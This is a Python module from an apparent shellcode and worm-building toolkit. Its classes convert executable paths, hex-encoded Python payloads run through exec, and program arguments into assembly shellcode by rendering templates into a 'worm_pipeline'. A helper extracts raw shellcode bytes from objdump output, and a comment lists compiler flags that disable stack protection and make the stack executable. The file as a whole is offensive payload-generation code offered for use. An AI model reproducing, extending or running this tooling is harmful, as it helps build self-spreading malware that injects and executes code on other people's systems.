import subprocess
import os
import re
from typing import Union
from jinja2 import Template

from .external_mods.mr_pattern import MrPattern
from .external_mods.shellcoder import MasterShellCoder

# COMPILER
# gcc -fno-stack-protector -z execstack -m32 -o test_shellcode test_shellcode.c



class ShellCoder:
    def __init__(self, external_modules_object: object):
        self.em = external_modules_object
        self.msg = self.em.msg
        self.compiler = self.em.master.cc

    
    def check_compiler(self) -> bool:
        if self.compiler.status:
            return True
        else:
            return False
    
    def make(self, worm_pipeline: object) -> object:
        if not self.check_compiler():
            worm_pipeline.last_error = 1
            return worm_pipeline
        exe_code = worm_pipeline.var.get("shell_path")
        # Create a path to be placed on the stack. The path is inverted and converted to ASCII
        exe_code = self.em.SC.shellcode_path(exe_code, return_ascii=True)
        # Conversion to assembler code
        exe_code = self.em.SC.shellcode_code_asm(exe_code)
        worm_pipeline.var["shell_path"] = exe_code
        code = Template(worm_pipeline.code)
        code = code.render(worm_pipeline.var)
        worm_pipeline.code = code
        return worm_pipeline



class PyShell:
    def __init__(self, external_modules_object: object):
        self.em = external_modules_object
        self.msg = self.em.msg
        self.compiler = self.em.master.cc

    def check_compiler(self) -> bool:
        if self.compiler.status:
            return True
        else:
            return False
    
    def make(self, worm_pipeline: object) -> object:
        if not self.check_compiler():
            return worm_pipeline
        py_exe = "/usr/bin/python3"
        py_exe = self.em.SC.shellcode_path(py_exe, return_ascii=True)
        payload = worm_pipeline.var.get("PY_script")
        if not payload:
            self.msg("error", "[!!] ERROR: No Payload in worm [!!]")
            return worm_pipeline
        payload = f"-cexec(bytes.fromhex('{payload.encode('utf-8').hex()}'))"
        payload = self.em.SC.shellcode_code(payload, return_ascii=True)
        worm_pipeline.var["PYshell_py_path"] = self.em.SC.shellcode_code_asm(py_exe)
        worm_pipeline.var["PY_script"] = self.em.SC.shellcode_code_asm(payload)
        code = Template(worm_pipeline.code)
        code = code.render(worm_pipeline.var)
        worm_pipeline.code = code
        return worm_pipeline



class Shellcoder_EXE:
    def __init__(self, external_modules_object: object):
        self.em = external_modules_object
        self.compiler = self.em.master.cc

    def check_compiler(self) -> bool:
        if self.compiler.status:
            return True
        else:
            return False
    
    def make(self, worm_pipeline: object) -> object:
        if not self.check_compiler():
            worm_pipeline.last_error = 1
            return worm_pipeline
        exe_path = worm_pipeline.var.get("SC_exe")
        exe_arg = worm_pipeline.var.get("SC_arg")
        exe_path = self.em.SC.shellcode_path(exe_path)
        exe_path = self.em.SC.shellcode_code_asm(exe_path)
        exe_arg = self.em.SC.shellcode_code(exe_arg, add_char="\x00")
        exe_arg = self.em.SC.shellcode_code_asm(exe_arg, correct_code=True)
        worm_pipeline.var["SC_exe"] = exe_path
        worm_pipeline.var["SC_arg"] = exe_arg
        code = Template(worm_pipeline.code)
        code = code.render(worm_pipeline.var)
        worm_pipeline.code = code
        return worm_pipeline

    


class ExternalModules:
    def __init__(self, coder: object, master_compiler: object, worm_construtcor: object):
        self.coder = coder
        self.dir_out = self.coder.dir_out
        self.msg = self.coder.msg
        self.master = master_compiler
        self.worm_constructor = worm_construtcor
        self.init_modules()

    def init_modules(self) -> None:
        self.SC = MasterShellCoder(self)
        self.shellcoder = ShellCoder(self)
        self.py_shell = PyShell(self)
        self.shell_exe = Shellcoder_EXE(self)
        self.pattern = MrPattern(self)
    
    def show_opcode(self, fpath: str) -> str:
        raw_out = subprocess.run(['objdump', '-d', fpath], stdout=subprocess.PIPE)
        raw = raw_out.stdout.decode("utf-8")
        self.msg("msg", f"objdump result:\n{raw}")
        # machine code extract
        lines = raw.splitlines()
        instruction_lines = [line for line in lines if re.match(r'^\s*[0-9a-f]+:\s+[0-9a-f]{2}', line)]
        # extract bytes
        bytes_list = []
        for line in instruction_lines:
            bytes_in_line = re.findall(r'\b[0-9a-f]{2}\b', line)
            bytes_list.extend(bytes_in_line)
        shellcode = ''.join([f"\\x{byte}" for byte in bytes_list])
        self.msg("msg", f"ShellCode:\n{shellcode}")
        self.msg("msg", f"Shellcode Length: {int(len(shellcode) / 4)}")
        return shellcode
    
    def use(self, worm_pipeline: object) -> object:
        ext = worm_pipeline.gvar.get("EXTERNAL_SCRIPT")
        match ext:
            case "Shellcoder":
                worm_pipeline = self.shellcoder.make(worm_pipeline)
            case "Shellcoder_EXE":
                worm_pipeline = self.shell_exe.make(worm_pipeline)
            case "PyShell":
                worm_pipeline = self.py_shell.make(worm_pipeline)
            case _:
                self.msg("error", f"[!!] ERROR: Unknown modules: '{ext}' [!!]")
        return worm_pipeline
